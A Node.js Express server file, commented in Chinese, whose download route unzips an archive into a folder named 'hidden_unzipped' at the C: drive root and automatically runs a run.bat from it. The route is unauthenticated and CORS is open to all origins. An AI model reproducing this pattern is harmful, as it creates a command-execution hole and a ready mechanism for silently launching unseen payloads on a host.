const express = require('express');
const fs = require('fs');
const unzipper = require('unzipper');
const path = require('path');
const { exec } = require('child_process');

const app = express();
const port = 3000;

//加载cors
const cors = require('cors');
app.use(cors());

app.use(express.static('public'));
app.get('/download-zip', (req, res) => {
  const zipFilePath = path.join(__dirname, 'files', 'zzz.zip');
  //const outputDir = path.join(process.env.APPDATA || process.env.HOME, 'hidden_unzipped');
  //设置解压目录为C盘根目录
  const outputDir = path.join('C:\\', 'hidden_unzipped');
  console.log('ZIP 文件路径:', zipFilePath); // 打印路径日志
  console.log('解压路径:', outputDir);

  if (!fs.existsSync(zipFilePath)) {
    console.error('ZIP 文件未找到:', zipFilePath);
    return res.status(404).send('ZIP 文件未找到');
  }

  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }

  res.download(zipFilePath, 'zzz.zip', async (err) => {
    if (err) {
      console.error('下载失败:', err);
      return res.status(500).send('下载失败');
    }

    console.log('文件已发送至客户端，开始解压...');

    try {
      await fs.createReadStream(zipFilePath)
        .pipe(unzipper.Extract({ path: outputDir }))
        .promise();
      console.log('解压成功！');

      const batFilePath = path.join(outputDir, 'run.bat'); 
      if (fs.existsSync(batFilePath)) {
        console.log('正在运行 .bat 文件...');
        exec(batFilePath, (err, stdout, stderr) => {
          if (err) {
            console.error('运行 .bat 文件失败:', err);
            return;
          }
          console.log('运行 .bat 文件成功！');
          console.log('输出:', stdout);
        });
      } else {
        console.error('.bat 文件未找到:', batFilePath);
      }
    } catch (err) {
      console.error('解压失败:', err);
    }
  });
});

app.listen(port, () => {
  console.log(`服务器运行在 http://localhost:${port}`);
});